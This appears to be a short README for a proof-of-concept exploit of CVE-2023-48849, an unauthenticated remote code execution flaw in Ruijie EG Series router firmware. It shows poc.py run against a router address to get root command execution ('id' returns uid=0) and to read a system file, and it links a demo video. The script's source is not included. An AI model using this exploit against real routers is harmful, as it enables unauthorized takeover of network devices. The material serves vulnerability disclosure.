# CVE-2023-48849

Ruijie EG Series Routers firmware <=EG_3.0(1)B11P216 allows unauthenticated attackers to remotely execute arbitrary code due to incorrect filtering.

```
$ python3 poc.py 192.168.1.1 'id'
uid=0(root) gid=0(root)
$ python3 poc.py 192.168.1.1 'grep TARGET /etc/openwrt_release'
DISTRIB_TARGET='mediatek/eg310gh-e'
```

[DEMO](https://youtu.be/_EcT8_9rkNA)
